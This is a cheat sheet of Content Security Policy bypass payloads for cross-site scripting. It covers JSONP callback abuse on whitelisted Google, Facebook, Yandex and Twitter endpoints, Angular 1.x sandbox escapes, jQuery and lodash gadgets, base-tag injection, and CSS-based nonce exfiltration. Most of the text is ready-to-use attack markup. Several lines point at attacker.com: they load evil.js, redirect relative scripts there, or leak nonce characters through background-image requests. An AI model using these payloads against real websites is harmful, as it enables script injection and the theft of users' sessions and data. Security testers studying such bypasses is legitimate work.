# CSP Bypass Payloads
# For use when a Content Security Policy is in place but contains exploitable misconfigurations
# Does NOT require unsafe-inline — these bypass policies without that directive
# Verify endpoint availability before use — JSONP endpoints change frequently

# ===== JSONP ENDPOINT ABUSE =====
# Principle: If a whitelisted domain hosts a JSONP endpoint, the callback parameter
# becomes arbitrary JavaScript. The script tag is allowed by CSP because the domain is whitelisted.
# CSP required: script-src https://WHITELISTED_DOMAIN

# Google accounts JSONP (verify endpoint availability)
# CSP: script-src https://accounts.google.com
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>

# Google APIs / Tag Manager
# CSP: script-src https://www.googletagmanager.com
<script src="https://www.googletagmanager.com/gtm.js?id=GTM-XXXX&callback=alert(1)//"></script>

# Facebook (historical — verify current availability)
# CSP: script-src https://connect.facebook.net
<script src="https://connect.facebook.net/en_US/sdk.js?callback=alert(1)//"></script>

# Yandex JSONP (historical)
# CSP: script-src https://mc.yandex.ru
<script src="https://mc.yandex.ru/watch/XXXX?callback=alert(1)//"></script>

# Twitter widgets (historical)
# CSP: script-src https://platform.twitter.com
<script src="https://platform.twitter.com/widgets.js?callback=alert(1)//"></script>

# ===== SCRIPT GADGETS — ANGULAR 1.X =====
# Principle: Angular 1.x (< 1.6) evaluates template expressions in the DOM.
# constructor.constructor('code')() reaches Function constructor.
# CSP required: script-src 'self' ajax.googleapis.com (or any Angular-hosting CDN)

# Angular 1.5.x sandbox bypass
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.11/angular.min.js"></script>

# Angular 1.4.x
<div ng-app ng-csp>{{$on.curry.call().alert(1)}}</div>

# Angular 1.3.x
<div ng-app>{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}</div>

# ===== SCRIPT GADGETS — JQUERY =====
# Principle: jQuery's $.globalEval() and ajax callbacks can execute arbitrary code
# if user-controlled data flows through them.
# CSP required: script-src 'self' code.jquery.com (or self-hosted jQuery)

# jQuery $.parseHTML with scripts — jQuery < 3.x
# If trusted code does: $(userControlledString) where string starts with <
# And the resulting element is appended to the DOM
# Payload: pass via DOM injection into jQuery-processed value:
<img src=x onerror=$.globalEval('alert(1)')>

# jQuery 3.x — $.ajax with script dataType
# note: requires ability to control the URL parameter in $.ajax call
$.ajax({url: 'https://attacker.com/evil.js', dataType: 'script'})

# ===== SCRIPT GADGETS — LODASH TEMPLATE =====
# Principle: Lodash _.template compiles to Function() internally.
# Prototype pollution of outputFunctionName triggers code execution on compile.
# CSP required: script-src 'self' (lodash hosted on same origin)

# note: pollute before any template compilation
<img src=x onerror="Object.prototype.outputFunctionName='a=alert(1)//'">

# ===== BASE TAG INJECTION =====
# Principle: Without base-uri in CSP, a <base> tag redirects all relative
# script loads to the attacker's origin.
# CSP required: missing base-uri directive

# Redirect all relative scripts to attacker
<base href="https://attacker.com/">
# note: all subsequent <script src="app.js"> load from https://attacker.com/app.js

# Redirect to attacker subdirectory
<base href="https://attacker.com/fakepath/">

# ===== NONCE EXFILTRATION VIA CSS INJECTION =====
# Principle: If CSS injection is possible, the nonce value can be exfiltrated using
# CSS attribute selectors that make requests based on attribute values.
# This technique works even without script execution.
# CSP required: CSS injection point on a page with nonced scripts

# Inject into a style attribute or <style> tag:
# Each rule leaks one character of the nonce via a background-image request
# Automate by generating rules for each possible character at each position

<style>
script[nonce^="a"] { background: url(https://attacker.com/nonce?c=a); }
script[nonce^="b"] { background: url(https://attacker.com/nonce?c=b); }
script[nonce^="c"] { background: url(https://attacker.com/nonce?c=c); }
/* ... continue for all base64 characters ... */
</style>
# note: once the first character is known, iterate on second position, etc.
# After full nonce recovery: inject <script nonce="RECOVERED">alert(1)</script>
